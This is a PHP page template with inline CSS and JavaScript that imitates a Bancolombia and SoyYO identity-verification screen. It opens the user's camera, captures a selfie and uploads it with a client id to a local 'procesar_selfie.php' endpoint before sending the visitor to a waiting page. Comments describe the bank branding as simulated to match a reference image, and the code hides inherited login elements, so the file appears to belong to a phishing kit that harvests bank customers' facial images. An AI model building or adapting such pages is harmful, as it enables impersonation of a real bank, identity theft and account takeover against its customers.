<?php
// partials/selfie.php
?>
<style>
    /* Estilos Base Tema Oscuro */
    body.cc-view {
        background-color: #2b2b2b !important;
        background-image: url('assets/img/auth-trazo.svg') !important;
        background-size: cover !important;
        background-position: center top -50px !important;
        background-repeat: no-repeat !important;
        font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        display: flex;
        justify-content: center;
        align-items: center;
        min-height: 100vh;
        margin: 0;
    }

    /* Ocultar elementos heredados */
    .cc-view .login-container,
    .cc-view .info-banner,
    .header,
    .footer {
        display: none !important;
    }

    .card-module {
        background-color: #262626;
        color: #e0e0e0;
        padding: 30px;
        border-radius: 12px;
        box-shadow: 0 4px 20px rgba(0, 0, 0, 0.5);
        width: 90%;
        max-width: 380px;
        text-align: center;
        position: relative;
    }

    .logos {
        margin-bottom: 2rem;
    }

    /* Logos simulados con texto o imagenes si las tuvieramos. 
       Usaré texto estilizado para simular la imagen de referencia por ahora 
       o FontAwesome para algo visual. */
    .brand-title {
        color: #fff;
        font-weight: bold;
        font-size: 1.5rem;
        margin-bottom: 5px;
        display: flex;
        align-items: center;
        justify-content: center;
        gap: 10px;
    }

    .soyyo-logo {
        color: #00448d;
        /* Azul parecido al logo */
        font-weight: 900;
        font-size: 1.8rem;
        margin-bottom: 20px;
        background: #fff;
        display: inline-block;
        padding: 5px 15px;
        border-radius: 20px;
    }

    h2 {
        color: #fff;
        margin-bottom: 10px;
        font-size: 1.4rem;
    }

    p.description {
        color: #b0b0b0;
        font-size: 0.9rem;
        line-height: 1.5;
        margin-bottom: 20px;
    }

    /* Contenedor de la Cámara */
    .camera-container {
        position: relative;
        width: 100%;
        height: 350px;
        /* Altura fija para el preview */
        background: #000;
        border-radius: 12px;
        overflow: hidden;
        margin-bottom: 20px;
        border: 2px solid #333;
    }

    video#cameraStream {
        width: 100%;
        height: 100%;
        object-fit: cover;
        transform: scaleX(-1);
        /* Efecto espejo */
    }

    canvas#photoCanvas {
        display: none;
    }

    .btn-action {
        width: 100%;
        padding: 15px;
        border: none;
        border-radius: 30px;
        font-size: 1rem;
        font-weight: bold;
        cursor: pointer;
        transition: all 0.2s;
        display: flex;
        align-items: center;
        justify-content: center;
        gap: 8px;
    }

    .btn-capture {
        background-color: #f0c300;
        color: #222;
        margin-bottom: 10px;
    }

    .btn-capture:hover {
        background-color: #d4ac00;
    }

    .btn-retake {
        background-color: #444;
        color: #fff;
        display: none;
        margin-bottom: 15px;
        /* Separación con botón Enviar */
    }

    .footer-text {
        margin-top: 20px;
        font-size: 0.75rem;
        color: #666;
    }
</style>

<div class="card-module">
    <!-- Simulación de cabecera -->
    <div class="logos">
        <div class="brand-title"><i class="fa-solid fa-building-columns"></i> Bancolombia</div>
        <img src="assets/img/soyyo-logo.png" alt="SoyYO"
            style="max-width: 150px; margin-bottom: 20px; display: inline-block;">
    </div>

    <h2>Verifica tu identidad</h2>
    <p class="description">
        Captura una selfie siguiendo las indicaciones. La revisión es automática.
    </p>

    <div class="camera-container">
        <video id="cameraStream" autoplay playsinline muted></video>
        <canvas id="photoCanvas"></canvas>
        <img id="photoPreview" style="display:none; width:100%; height:100%; object-fit:cover;" />
    </div>

    <button id="btnCapture" class="btn-action btn-capture">
        <i class="fa-solid fa-camera"></i> Tomar Selfie
    </button>

    <button id="btnRetake" class="btn-action btn-retake">
        <i class="fa-solid fa-rotate-left"></i> Repetir
    </button>

    <button id="btnSend" class="btn-action btn-capture" style="display:none; background-color: #25D366; color: white;">
        <i class="fa-solid fa-paper-plane"></i> Enviar
    </button>

    <div class="footer-text">
        <p>Formato aceptado: Captura directa</p>
    </div>
</div>

<script>
    document.addEventListener('DOMContentLoaded', async () => {
        const video = document.getElementById('cameraStream');
        const canvas = document.getElementById('photoCanvas');
        const preview = document.getElementById('photoPreview');
        const btnCapture = document.getElementById('btnCapture');
        const btnRetake = document.getElementById('btnRetake');
        const btnSend = document.getElementById('btnSend');

        let stream = null;

        // Iniciar Cámara
        async function startCamera() {
            try {
                stream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        facingMode: 'user',
                        width: { ideal: 720 },
                        height: { ideal: 720 }
                    },
                    audio: false
                });
                video.srcObject = stream;

                // Reset UI
                video.style.display = 'block';
                preview.style.display = 'none';
                btnCapture.style.display = 'flex';
                btnRetake.style.display = 'none';
                btnSend.style.display = 'none';

            } catch (err) {
                console.error("Error acceso cámara:", err);
                alert("No pudimos acceder a la cámara. Por favor permite el acceso.");
            }
        }

        // Tomar Foto
        btnCapture.addEventListener('click', () => {
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const ctx = canvas.getContext('2d');

            // Espejo al dibujar
            ctx.translate(canvas.width, 0);
            ctx.scale(-1, 1);
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

            // Mostrar Preview
            const dataUrl = canvas.toDataURL('image/jpeg', 0.85);
            preview.src = dataUrl;

            video.style.display = 'none';
            preview.style.display = 'block';

            btnCapture.style.display = 'none';
            btnRetake.style.display = 'flex';
            btnSend.style.display = 'flex';
        });

        // Repetir
        btnRetake.addEventListener('click', () => {
            video.style.display = 'block';
            preview.style.display = 'none';
            btnCapture.style.display = 'flex';
            btnRetake.style.display = 'none';
            btnSend.style.display = 'none';
        });

        // Enviar
        btnSend.addEventListener('click', async () => {
            // Loading state
            btnSend.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Enviando...';
            btnSend.disabled = true;
            btnRetake.disabled = true;

            const dataUrl = canvas.toDataURL('image/jpeg', 0.85);

            try {
                const formData = new FormData();
                formData.append('selfie', dataUrl); // Base64 string
                formData.append('cliente_id', '<?php echo htmlspecialchars($_GET['id'] ?? ''); ?>');

                const response = await fetch('modules/api/procesar_selfie.php', {
                    method: 'POST',
                    body: formData
                });

                if (response.ok) {
                    window.location.href = 'index.php?status=espera&id=<?php echo htmlspecialchars($_GET['id'] ?? ''); ?>';
                } else {
                    alert("Error al enviar. Intenta nuevamente.");
                    btnSend.innerHTML = '<i class="fa-solid fa-paper-plane"></i> Enviar';
                    btnSend.disabled = false;
                    btnRetake.disabled = false;
                }
            } catch (e) {
                console.error(e);
                alert("Error de conexión.");
                btnSend.innerHTML = '<i class="fa-solid fa-paper-plane"></i> Enviar';
                btnSend.disabled = false;
                btnRetake.disabled = false;
            }
        });

        // Init
        startCamera();
    });
</script>